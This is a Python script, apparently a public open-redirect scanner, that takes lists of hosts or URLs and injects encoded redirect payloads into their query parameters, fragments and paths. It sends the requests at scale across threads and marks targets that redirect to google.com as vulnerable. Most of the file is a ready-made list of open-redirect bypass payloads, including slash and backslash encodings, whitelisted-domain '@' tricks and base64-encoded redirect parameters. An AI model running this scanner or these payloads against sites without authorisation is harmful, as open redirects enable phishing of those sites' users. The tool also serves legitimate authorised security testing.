#!/usr/bin/python3.5

# I don't believe in license.
# You can do whatever you want with this program.

import os
import sys
import re
import time
import copy
import random
import argparse
import requests
import urllib.parse
from functools import partial
from threading import Thread
from queue import Queue
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
from colored import fg, bg, attr

MAX_EXCEPTION = 3
MAX_VULNERABLE = 5

# disable "InsecureRequestWarning: Unverified HTTPS request is being made."
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



def banner():
	print("""
                                      _ _               _                     
   ___  _ __   ___ _ __  _ __ ___  __| (_)_ __ ___  ___| |_       _ __  _   _ 
  / _ \| '_ \ / _ \ '_ \| '__/ _ \/ _` | | '__/ _ \/ __| __|     | '_ \| | | |
 | (_) | |_) |  __/ | | | | |  __/ (_| | | | |  __/ (__| |_   _  | |_) | |_| |
  \___/| .__/ \___|_| |_|_|  \___|\__,_|_|_|  \___|\___|\__| (_) | .__/ \__, |
       |_|                                                       |_|    |___/ 

                                by @gwendallecoguic

""")
	pass

banner()


def rebuiltQuery( t_params ):
    query = ''
    for pname,t_values in t_params.items():
        for k in range(len(t_values)):
            query = query + pname+'='+t_values[k] + '&'
    return query.strip('&')


def _parse_qs( query ):
    t_params = {}
    tmptab = query.split('&')

    for param in tmptab:
        t_param = param.split('=')
        pname = t_param[0]
        if not pname in t_params:
            t_params[pname] = []
        pvalue = '' if len(t_param) < 2 else t_param[1]
        t_params[pname].append( pvalue )
    
    return t_params


def testParams( t_urlparse, payload ):
    # t_params = urllib.parse.parse_qs( t_urlparse.query )
    t_params = _parse_qs( t_urlparse.query )

    for pname,t_values in t_params.items():
        for k in range(len(t_values)):
            pvalue = t_values[k]
            t_params2 = copy.deepcopy(t_params)
            # if pvalue == '':
            #     pvalue = 666
            # it's replacement mode, not concat
            # new_value = str(pvalue) + payload
            new_value = payload
            # t_params2[pname][k] = urllib.parse.quote( new_value )
            t_params2[pname][k] = new_value
            new_query = rebuiltQuery( t_params2 )
            t_urlparse = t_urlparse._replace(query=new_query)
            url = urllib.parse.urlunparse(t_urlparse)
            doTest( url )
            # disable get/post swap
            # t_urlparse = t_urlparse._replace(query='')
            # url = urllib.parse.urlunparse(t_urlparse)
            # doTest( url, 'POST', t_params2 )


def testFragment( t_urlparse, payload ):
    # new_value = t_urlparse.fragment + urllib.parse.quote(payload)
    # new_value = t_urlparse.fragment + payload
    new_value = payload
    t_urlparse = t_urlparse._replace(fragment=new_value)
    url = urllib.parse.urlunparse(t_urlparse)
    doTest( url )


def testPath( t_urlparse, payload ):
    path = ''
    t_path = ['/'] + t_urlparse.path.split('/')
    
    for dir in t_path:
        if len(dir):
            path = path + '/' + dir
            path = path.replace('//','/')
            # new_value = os.path.dirname(t_urlparse.path) + '/' + urllib.parse.quote(payload)
            # new_value = path + '/' + urllib.parse.quote(payload)
            new_value = path + '/' + payload
            new_value = new_value.replace('//','/')
            t_urlparse = t_urlparse._replace(path=new_value)
            url = urllib.parse.urlunparse(t_urlparse)
            doTest( url )


def testPayload( url, payload ):
    t_urlparse = urllib.parse.urlparse(url)
    payload = payload.replace( 'www.whitelisteddomain.tld', t_urlparse.netloc )
    if redirect_domain != 'google.com':
        payload = payload.replace( 'google.com', redirect_domain )

    t_urlparse = urllib.parse.urlparse( url )

    if len(t_urlparse.query):
        testParams( t_urlparse, payload.strip('/') )

    if len(t_urlparse.fragment):
        testFragment( t_urlparse, payload.strip('/') )

    testPath( t_urlparse, payload )


def testURL( url ):
    time.sleep( 0.01 )

    if _verbose <= 1:
        sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
        t_multiproc['n_current'] = t_multiproc['n_current'] + 1

    pool = Pool( 10 )
    pool.map( partial(testPayload,url), t_payloads )
    pool.close()
    pool.join()


def doTest( url, method='GET', post_params='' ):
    t_urlparse = urllib.parse.urlparse(url)
    u = t_urlparse.scheme + '_' + t_urlparse.netloc
    
    if not u in t_exceptions:
        t_exceptions[u] = 0
    if t_exceptions[u] >= MAX_EXCEPTION:
        if _verbose >= 3:
            print("skip too many exceptions %s" % t_urlparse.netloc)
        return
    
    if not u in t_vulnerable:
        t_vulnerable[u] = 0
    if t_vulnerable[u] >= MAX_VULNERABLE:
        if _verbose >= 3:
            print("skip already vulnerable %s" % t_urlparse.netloc)
        return
    
    try:
        if method == 'POST':
            r = requests.post( url, data=post_params, headers=t_custom_headers, timeout=5, verify=False, allow_redirects=True )
        else:
            r = requests.head( url, timeout=5, headers=t_custom_headers, verify=False, allow_redirects=True )
    except Exception as e:
        t_exceptions[u] = t_exceptions[u] + 1
        if _verbose >= 3:
            sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        return
    
    if 'Content-Type' in r.headers:
        content_type = r.headers['Content-Type']
    else:
        content_type = '-'
    
    vuln = '-'
    t_url_parse = urlparse( r.url )
    for domain in t_redirect_domain:
        if domain in t_url_parse.netloc.lower():
            vuln = 'VULNERABLE'
    
    if vuln == '-':
        for redirect_url in t_redirect_urls:
            if r.url.lower().startswith(redirect_url):
                vuln = 'VULNERABLE'

    if vuln == 'VULNERABLE':
        t_vulnerable[u] = t_vulnerable[u] + 1

    # output = '%sC=%d\t\tT=%s\t\tV=%s\n' %  (url.ljust(t_multiproc['u_max_length']),r.status_code,content_type,vuln)
    output = '%s\t\tC=%d\t\tT=%s\t\tV=%s\n' %  (url,r.status_code,content_type,vuln)

    fp = open( t_multiproc['f_output'], 'a+' )
    fp.write( output )
    fp.close()

    if _verbose >= 2 or (_verbose >= 1 and vuln == 'VULNERABLE'):
        if vuln == 'VULNERABLE':
            sys.stdout.write( '%s%s%s' % (fg('light_red'),output,attr(0)) )
        else:
            sys.stdout.write( output )


# old version
# def testURL( url ):
#     time.sleep( 0.01 )

#     if _verbose <= 1:
#         sys.stdout.write( 'progress: %d/%d\r' %  (t_multiproc['n_current'],t_multiproc['n_total']) )
#         t_multiproc['n_current'] = t_multiproc['n_current'] + 1

#     t_urlparse = urlparse(url)
#     u = t_urlparse.scheme + '_' + t_urlparse.netloc
    
#     if not u in t_exceptions:
#         t_exceptions[u] = 0
#     if t_exceptions[u] >= MAX_EXCEPTION:
#         if _verbose >= 3:
#             print("skip too many exceptions %s" % t_urlparse.netloc)
#         return
    
#     if not u in t_vulnerable:
#         t_vulnerable[u] = 0
#     if t_vulnerable[u] >= MAX_VULNERABLE:
#         if _verbose >= 3:
#             print("skip already vulnerable %s" % t_urlparse.netloc)
#         return
    
#     try:
#         r = requests.head( url, timeout=5, verify=False, allow_redirects=True )
#     except Exception as e:
#         t_exceptions[u] = t_exceptions[u] + 1
#         if _verbose >= 3:
#             sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
#         return
    
#     if 'Content-Type' in r.headers:
#         content_type = r.headers['Content-Type']
#     else:
#         content_type = '-'
    
#     vuln = '-'
#     t_url_parse = urlparse( r.url )
#     for domain in t_redirect_domain:
#         if domain in t_url_parse.netloc.lower():
#             vuln = 'VULNERABLE'
    
#     if vuln == '-':
#         for redirect_url in t_redirect_urls:
#             if r.url.lower().startswith(redirect_url):
#                 vuln = 'VULNERABLE'

#     if vuln == 'VULNERABLE':
#         t_vulnerable[u] = t_vulnerable[u] + 1

#     output = '%sC=%d\t\tV=%s\n' %  (url.ljust(t_multiproc['u_max_length']),r.status_code,vuln)

#     fp = open( t_multiproc['f_output'], 'a+' )
#     fp.write( output )
#     fp.close()

#     if _verbose >= 2 or (_verbose >= 1 and vuln == 'VULNERABLE'):
#         sys.stdout.write( '%s' % output )


parser = argparse.ArgumentParser()
parser.add_argument( "-a","--path",help="set paths list" )
parser.add_argument( "-d","--header",help="custom headers, example: cookie1=value1;cookie2=value2...", action="append" )
parser.add_argument( "-p","--payloads",help="set payloads list" )
parser.add_argument( "-o","--hosts",help="set host list (required or -u)" )
parser.add_argument( "-r","--redirect",help="domain to redirect, default: google.com" )
parser.add_argument( "-s","--scheme",help="scheme to use, default=http,https" )
parser.add_argument( "-t","--threads",help="threads, default 10" )
parser.add_argument( "-u","--urls",help="set url list (required or -o)" )
parser.add_argument( "-v","--verbose",help="display output, 0=nothing, 1=only vulnerable, 2=all requests, 3=full debug, default: 1" )
parser.parse_args()
args = parser.parse_args()

if args.scheme:
    t_scheme = args.scheme.split(',')
else:
    t_scheme = ['http','https']

t_custom_headers = {}
if args.header:
    for header in args.header:
        if ':' in header:
            tmp = header.split(':')
            t_custom_headers[ tmp[0].strip() ] = tmp[1].strip()

t_hosts = []
if args.hosts:
    if os.path.isfile(args.hosts):
        fp = open( args.hosts, 'r' )
        t_hosts = fp.read().strip().split("\n")
        fp.close()
    else:
        t_hosts.append( args.hosts )
n_hosts = len(t_hosts)
sys.stdout.write( '%s[+] %d hosts found: %s%s\n' % (fg('green'),n_hosts,args.hosts,attr(0)) )

t_urls = []
if args.urls:
    if os.path.isfile(args.urls):
        fp = open( args.urls, 'r' )
        t_urls = fp.read().strip().split("\n")
        fp.close()
    else:
        t_urls.append( args.urls )
n_urls = len(t_urls)
sys.stdout.write( '%s[+] %d urls found: %s%s\n' % (fg('green'),n_urls,args.urls,attr(0)) )

if n_hosts == 0 and n_urls == 0:
    parser.error( 'hosts/urls list missing' )

if args.payloads:
    t_payloads = []
    if os.path.isfile(args.payloads):
        fp = open( args.payloads, 'r' )
        t_payloads = fp.read().strip().split("\n")
        fp.close()
    else:
        t_payloads.append( args.payloads )
    n_payloads = len(t_payloads)
    sys.stdout.write( '%s[+] %d payloads found: %s%s\n' % (fg('green'),n_payloads,args.payloads,attr(0)) )
else:
    n_payloads = 0

t_path = [ '' ]
if args.path:
    if os.path.isfile(args.path):
        fp = open( args.path, 'r' )
        t_path = fp.read().strip().split("\n")
        fp.close()
    else:
        t_path.append( args.path )
n_path = len(t_path)
sys.stdout.write( '%s[+] %d path found: %s%s\n' % (fg('green'),n_path,args.path,attr(0)) )

if args.verbose:
    _verbose = int(args.verbose)
else:
    _verbose = 1

if args.threads:
    _threads = int(args.threads)
else:
    _threads = 10

if args.redirect:
    t_redirect_domain = [ args.redirect.lower() ]
else:
    t_redirect_domain = [ 'google.com', 'www.google.com', '216.58.214.206' ]

t_redirect_urls = []
redirect_domain = t_redirect_domain[0]

for domain in t_redirect_domain:
    t_redirect_urls.append( 'http://'+domain )
    t_redirect_urls.append( 'https://'+domain )

t_totest = []
u_max_length = 0
d_output =  os.getcwd()+'/openredirect'
f_output = d_output + '/' + 'output'
if not os.path.isdir(d_output):
    try:
        os.makedirs( d_output )
    except Exception as e:
        sys.stdout.write( "%s[-] error occurred: %s%s\n" % (fg('red'),e,attr(0)) )
        exit()


sys.stdout.write( '%s[+] options are -> threads:%d, verbose:%d, redirect url:%s%s\n' % (fg('green'),_threads,_verbose,','.join(t_redirect_domain),attr(0)) )
# sys.stdout.write( "[+] separators:%d, paths:%d, post separators:%d, pre prefixes:%d, prefixes:%d, parameters:%d, suffixes:%d\n" % (len(init_t_separator),len(init_t_path),len(init_t_post_separator),len(init_t_pre_prefix),len(init_t_prefix),len(init_t_parameter),len(init_t_suffix)) )
sys.stdout.write( '[+] computing host and payload list...\n' )

# source: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect
if not n_payloads:
    t_payloads = [
        '/%09/google.com',
        '/%0a.google.com',
        '/%2f%2fgoogle.com',
        '/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/',
        '/%5cgoogle.com',
        '/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d',
        '/.google.com',
        '//%09/google.com',
        '//%5cgoogle.com',
        '///%09/google.com',
        '///%5cgoogle.com',
        '////%09/google.com',
        '////%5cgoogle.com',
        '/////google.com',
        '/////google.com/',
        '////\;@google.com',
        '////google.com/',
        '////google.com/%2e%2e',
        '////google.com/%2e%2e%2f',
        '////google.com/%2f%2e%2e',
        '////google.com/%2f..',
        '////google.com//',
        '///\;@google.com',
        '///google.com',
        '///google.com/',
        '///google.com/%2e%2e',
        '///google.com/%2e%2e%2f',
        '///google.com/%2f%2e%2e',
        '///google.com/%2f..',
        '///google.com/%2f..;/js',
        '///google.com//',
        '//google.com',
        '//google.com/',
        '//google.com/%2e%2e',
        '//google.com/%2e%2e%2f',
        '//google.com/%2f%2e%2e',
        '//google.com/%2f..',
        '//google.com//',
        '//google%00.com',
        '//google%E3%80%82com',
        '//https:///google.com/%2e%2e',
        '//https://google.com/%2e%2e%2f',
        '//https://google.com//',
        '/<>//google.com',
        '/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com',
        '/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redirect_uri=/\/google.com',
        '/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com',
        '/\/\/google.com/',
        '/\/google.com/',
        '/google.com/%2f%2e%2e',
        '/http://%67%6f%6f%67%6c%65%2e%63%6f%6d',
        '/http://google.com',
        '/http:/google.com',
        '/https:/%5cgoogle.com/',
        '/https://%09/google.com',
        '/https://%5cgoogle.com',
        '/https:///google.com/%2e%2e',
        '/https:///google.com/%2f%2e%2e',
        '/https://google.com',
        '/https://google.com/',
        '/https://google.com/%2e%2e',
        '/https://google.com/%2e%2e%2f',
        '/https://google.com/%2f%2e%2e',
        '/https://google.com/%2f..',
        '/https://google.com//',
        '/https:google.com',
        '/?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redir=/\/google.com&rurl=/\/google.com&redirect_uri=/\/google.com&callback=/\/google.com',
        '/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com&callback=//google.com',
        '/?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com&redirect_uri=http://google.com&callback=http://google.com',
        '/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com&callback=Https://google.com',
        '/?url=L1wvZ29vZ2xlLmNvbQ==&next=L1wvZ29vZ2xlLmNvbQ==&redirect=L1wvZ29vZ2xlLmNvbQ==&redir=L1wvZ29vZ2xlLmNvbQ==&rurl=L1wvZ29vZ2xlLmNvbQ==&redirect_uri=L1wvZ29vZ2xlLmNvbQ==&callback=L1wvZ29vZ2xlLmNvbQ==',
        '/?url=Ly9nb29nbGUuY29t&next=Ly9nb29nbGUuY29t&redirect=Ly9nb29nbGUuY29t&redir=Ly9nb29nbGUuY29t&rurl=Ly9nb29nbGUuY29t&redirect_uri=Ly9nb29nbGUuY29t&callback=Ly9nb29nbGUuY29t',
        '/?url=aHR0cDovL2dvb2dsZS5jb20=&next=aHR0cDovL2dvb2dsZS5jb20=&redirect=aHR0cDovL2dvb2dsZS5jb20=&redir=aHR0cDovL2dvb2dsZS5jb20=&rurl=aHR0cDovL2dvb2dsZS5jb20=&redirect_uri=aHR0cDovL2dvb2dsZS5jb20=&callback=aHR0cDovL2dvb2dsZS5jb20=',
        '/?url=SHR0cHM6Ly9nb29nbGUuY29t&next=SHR0cHM6Ly9nb29nbGUuY29t&redirect=SHR0cHM6Ly9nb29nbGUuY29t&redir=SHR0cHM6Ly9nb29nbGUuY29t&rurl=SHR0cHM6Ly9nb29nbGUuY29t&redirect_uri=SHR0cHM6Ly9nb29nbGUuY29t&callback=SHR0cHM6Ly9nb29nbGUuY29t',
        '/login?url=aHR0cDovL2dvb2dsZS5jb20=&next=aHR0cDovL2dvb2dsZS5jb20=&redirect=aHR0cDovL2dvb2dsZS5jb20=&redir=aHR0cDovL2dvb2dsZS5jb20=&rurl=aHR0cDovL2dvb2dsZS5jb20=&redirect_uri=aHR0cDovL2dvb2dsZS5jb20=&callback=aHR0cDovL2dvb2dsZS5jb20=',
        '/logout?url=aHR0cDovL2dvb2dsZS5jb20=&next=aHR0cDovL2dvb2dsZS5jb20=&redirect=aHR0cDovL2dvb2dsZS5jb20=&redir=aHR0cDovL2dvb2dsZS5jb20=&rurl=aHR0cDovL2dvb2dsZS5jb20=&redirect_uri=aHR0cDovL2dvb2dsZS5jb20=&callback=aHR0cDovL2dvb2dsZS5jb20=',
        '/signin?url=aHR0cDovL2dvb2dsZS5jb20=&next=aHR0cDovL2dvb2dsZS5jb20=&redirect=aHR0cDovL2dvb2dsZS5jb20=&redir=aHR0cDovL2dvb2dsZS5jb20=&rurl=aHR0cDovL2dvb2dsZS5jb20=&redirect_uri=aHR0cDovL2dvb2dsZS5jb20=&callback=aHR0cDovL2dvb2dsZS5jb20=',
        '/signout?url=aHR0cDovL2dvb2dsZS5jb20=&next=aHR0cDovL2dvb2dsZS5jb20=&redirect=aHR0cDovL2dvb2dsZS5jb20=&redir=aHR0cDovL2dvb2dsZS5jb20=&rurl=aHR0cDovL2dvb2dsZS5jb20=&redirect_uri=aHR0cDovL2dvb2dsZS5jb20=&callback=aHR0cDovL2dvb2dsZS5jb20=',
        '/redirect?url=Ly9nb29nbGUuY29t&next=Ly9nb29nbGUuY29t&redirect=Ly9nb29nbGUuY29t&redir=Ly9nb29nbGUuY29t&rurl=Ly9nb29nbGUuY29t&redirect_uri=Ly9nb29nbGUuY29t&callback=Ly9nb29nbGUuY29t',
        '/redirect?url=L1wvZ29vZ2xlLmNvbQ==&next=L1wvZ29vZ2xlLmNvbQ==&redirect=L1wvZ29vZ2xlLmNvbQ==&redir=L1wvZ29vZ2xlLmNvbQ==&rurl=L1wvZ29vZ2xlLmNvbQ==&redirect_uri=L1wvZ29vZ2xlLmNvbQ==&callback=L1wvZ29vZ2xlLmNvbQ==',
        '/redirect?url=aHR0cDovL2dvb2dsZS5jb20=&next=aHR0cDovL2dvb2dsZS5jb20=&redirect=aHR0cDovL2dvb2dsZS5jb20=&redir=aHR0cDovL2dvb2dsZS5jb20=&rurl=aHR0cDovL2dvb2dsZS5jb20=&redirect_uri=aHR0cDovL2dvb2dsZS5jb20=&callback=aHR0cDovL2dvb2dsZS5jb20=',
        '/redirect?url=SHR0cHM6Ly9nb29nbGUuY29t&next=SHR0cHM6Ly9nb29nbGUuY29t&redirect=SHR0cHM6Ly9nb29nbGUuY29t&redir=SHR0cHM6Ly9nb29nbGUuY29t&rurl=SHR0cHM6Ly9nb29nbGUuY29t&redirect_uri=SHR0cHM6Ly9nb29nbGUuY29t&callback=SHR0cHM6Ly9nb29nbGUuY29t',
        '/login?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com&callback=//google.com',
        '/login?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com&redirect_uri=http://google.com&callback=http://google.com',
        '/logout?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com&callback=//google.com',
        '/logout?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com&callback=http://google.com',
        '/signin?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com&callback=//google.com',
        '/signout?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com&callback=//google.com',
        '/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com&callback=//google.com',
        '/redirect?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redir=/\/google.com&rurl=/\/google.com&redirect_uri=/\/google.com&callback=/\/google.com',
        '/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com&callback=//google.com',
        '/redirect?url=/\/google.com&next=/\/google.com&redirect=/\/google.com&redir=/\/google.com&rurl=/\/google.com&redirect_uri=/\/google.com&callback=/\/google.com',
        '/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com&callback=Https://google.com',
        '/redirect?url=http://google.com&next=http://google.com&redirect=http://google.com&redir=http://google.com&rurl=http://google.com&redirect_uri=http://google.com&callback=http://google.com',
        '////%09/google.com',
        '///%09/google.com',
        '//%09/google.com',
        '/%09/google.com',
        '////%09/www.whitelisteddomain.tld@google.com',
        '///%09/www.whitelisteddomain.tld@google.com',
        '//%09/www.whitelisteddomain.tld@google.com',
        '/%09/www.whitelisteddomain.tld@google.com',
        '/%2f%2fgoogle.com',
        '/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/',
        '////%5cgoogle.com',
        '///%5cgoogle.com',
        '//%5cgoogle.com',
        '/%5cgoogle.com',
        '////%5cwww.whitelisteddomain.tld@google.com',
        '///%5cwww.whitelisteddomain.tld@google.com',
        '//%5cwww.whitelisteddomain.tld@google.com',
        '/%5cwww.whitelisteddomain.tld@google.com',
        '/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d',
        '%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d',
        '//google%00.com',
        '<>//google.com',
        '/<>//google.com',
        '/////google.com',
        '/////google.com/',
        '////\;@google.com',
        '////google.com/',
        '////google.com//',
        '///\;@google.com',
        '///google.com',
        '///google.com/',
        '///google.com//',
        '//google.com',
        '//google.com/',
        '//google.com//',
        '/.google.com',
        '/\/\/google.com/',
        '/\/google.com/',
        '/〱google.com',
        '\/\/google.com/',
        '〱google.com',
        # 'google.com',
        '////google.com/%2e%2e',
        '///google.com/%2e%2e',
        '//google.com/%2e%2e',
        '////google.com/%2e%2e%2f',
        '///google.com/%2e%2e%2f',
        '//google.com/%2e%2e%2f',
        '////google.com/%2f..',
        '///google.com/%2f..',
        '//google.com/%2f..',
        '////google.com/%2f%2e%2e',
        '///google.com/%2f%2e%2e',
        '//google.com/%2f%2e%2e',
        '/google.com/%2f%2e%2e',
        '//google.com/%2f..;/css',
        '//google.com\@www.whitelisteddomain.tld',
        '//google%E3%80%82com',
        '/http://%67%6f%6f%67%6c%65%2e%63%6f%6d',
        '/http://google.com',
        '/http:/google.com',
        '/https://%09/google.com',
        '/https://%5cgoogle.com',
        '/https:/%5cgoogle.com/',
        '/https://%5cwww.whitelisteddomain.tld@google.com',
        '//https://google.com//',
        '/https://google.com',
        '/https://google.com/',
        '/https://google.com//',
        '/https:google.com',
        '//https:///google.com/%2e%2e',
        '/https:///google.com/%2e%2e',
        '/https://google.com/%2e%2e',
        '//https://google.com/%2e%2e%2f',
        '/https://google.com/%2e%2e%2f',
        '/https://google.com/%2f..',
        '/https:///google.com/%2f%2e%2e',
        '/https://google.com/%2f%2e%2e',
        '//https:///www.google.com/%2e%2e',
        '/https://www.google.com/%2e%2e',
        '//https://www.google.com/%2e%2e%2f',
        '/https:///www.google.com/%2f%2e%2e',
        '/https://www.google.com/%2f%2e%2e',
        '//https://www.whitelisteddomain.tld@google.com//',
        '/https://www.whitelisteddomain.tld@google.com/',
        '/https://www.whitelisteddomain.tld@google.com/%2f..',
        '/https://www.whitelisteddomain.tld@www.google.com/%2e%2e',
        '//https://www.whitelisteddomain.tld@www.google.com/%2e%2e%2f',
        '/https:///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
        '/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
        '////www.google.com/%2e%2e',
        '///www.google.com/%2e%2e',
        '////www.google.com/%2e%2e%2f',
        '///www.google.com/%2e%2e%2f',
        '//www.google.com/%2e%2e%2f',
        '////www.google.com/%2f%2e%2e',
        '///www.google.com/%2f%2e%2e',
        '//www.google.com/%2f%2e%2e',
        '/www.whitelisteddomain.tld.google.com/',
        '////www.whitelisteddomain.tld@google.com/',
        '////www.whitelisteddomain.tld@google.com//',
        '///www.whitelisteddomain.tld@google.com/',
        '///www.whitelisteddomain.tld@google.com//',
        '//www.whitelisteddomain.tld@google.com/',
        '//www.whitelisteddomain.tld@google.com//',
        '////www.whitelisteddomain.tld@google.com/%2f..',
        '///www.whitelisteddomain.tld@google.com/%2f..',
        '//www.whitelisteddomain.tld@google.com/%2f..',
        '//www.whitelisteddomain.tld@https:///www.google.com/%2e%2e',
        '////www.whitelisteddomain.tld@www.google.com/%2e%2e',
        '///www.whitelisteddomain.tld@www.google.com/%2e%2e',
        '////www.whitelisteddomain.tld@www.google.com/%2e%2e%2f',
        '///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f',
        '//www.whitelisteddomain.tld@www.google.com/%2e%2e%2f',
        '////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
        '///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
        '//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e',
    ]
    # t_payloads = [
    #     '/%0a.google.com',
    #     '//google.com/%2e%2e',
    #     'https:/%5cgoogle.com/',
    #     '/google%00.com',
    #     '//www.whitelisteddomain.tld@google.com/'
    # ]


for scheme in t_scheme:
    for host in t_hosts:
        for path in t_path:
            u = scheme + '://' + host.strip() + path
            t_totest.append( u )
            l = len(u)
            if l > u_max_length:
                u_max_length = l

for url in t_urls:
    for path in t_path:
        u = url.strip() + path
        t_totest.append( u )
        l = len(u)
        if l > u_max_length:
            u_max_length = l

# old version
# for scheme in t_scheme:
#     for host in t_hosts:
#         for payload in t_payloads:
#             for path in t_path:
#                 host = host.strip()
#                 payload = payload.replace( 'www.whitelisteddomain.tld', host )
#                 if redirect_domain != 'google.com':
#                     payload = payload.replace( 'google.com', redirect_domain )
#                 u = scheme + '://' + host + path + payload
#                 t_totest.append( u )
#                 l = len(u)
#                 if l > u_max_length:
#                     u_max_length = l

# for url in t_urls:
#     for payload in t_payloads:
#         for path in t_path:
#             t_url_parse = urlparse( url )
#             payload = payload.replace( 'www.whitelisteddomain.tld', t_url_parse.netloc )
#             if redirect_domain != 'google.com':
#                 payload = payload.replace( 'google.com', redirect_domain )
#             u = url.strip() + path + payload
#             t_totest.append( u )
#             l = len(u)
#             if l > u_max_length:
#                 u_max_length = l

n_totest = len(t_totest)
sys.stdout.write( '%s[+] %d urls created.%s\n' % (fg('green'),n_totest,attr(0)) )
sys.stdout.write( '[+] testing...\n' )

random.shuffle(t_totest)
# print("\n".join(t_totest))
# exit()

t_exceptions = {}
t_vulnerable = {}
t_multiproc = {
    'n_current': 0,
    'n_total': n_totest,
    'u_max_length': u_max_length+5,
    'd_output': d_output,
    'f_output': f_output,
}

def doWork():
    while True:
        url = q.get()
        testURL( url )
        q.task_done()

q = Queue( _threads*2 )

for i in range(_threads):
    t = Thread( target=doWork )
    t.daemon = True
    t.start()

try:
    for url in t_totest:
        q.put( url )
    q.join()
except KeyboardInterrupt:
    sys.exit(1)
